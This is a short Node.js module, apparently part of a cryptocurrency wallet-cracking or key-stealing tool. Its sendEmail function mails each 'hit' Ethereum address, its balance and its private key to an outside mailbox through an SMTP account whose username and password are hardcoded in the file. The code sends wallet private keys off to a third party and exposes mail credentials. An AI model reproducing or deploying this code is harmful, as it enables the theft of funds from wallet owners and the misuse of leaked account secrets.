// email.js

const nodemailer = require('nodemailer');

const transporter = nodemailer.createTransport({
    host: 'smtp.email.cn',
    port: 25,
    secure: false, // 
    auth: {
        user: 'eth888@email.cn',
        pass: 'UU44VhY9RVzAzbsJ'
    }
});

function sendEmail(address, balance, privateKey, errorMessage = null) {
    let text = `Hit\nETH address ${address}\nThe balance is ${balance.toString()}个，\nThe private key is ${privateKey}`;
    if (errorMessage) {
        text += `\nAn error occurred：${errorMessage}`;
    }
    const mailOptions = {
        from: 'eth888@email.cn',
        to: 'yxk888@88.com',
        subject: 'Hit ETH wallet',
        text: text
    };

    transporter.sendMail(mailOptions, (error) => {
        if (error) {
            console.log('no！:', error);
        } else {
            console.log('');
        }
    });
}

module.exports = sendEmail;
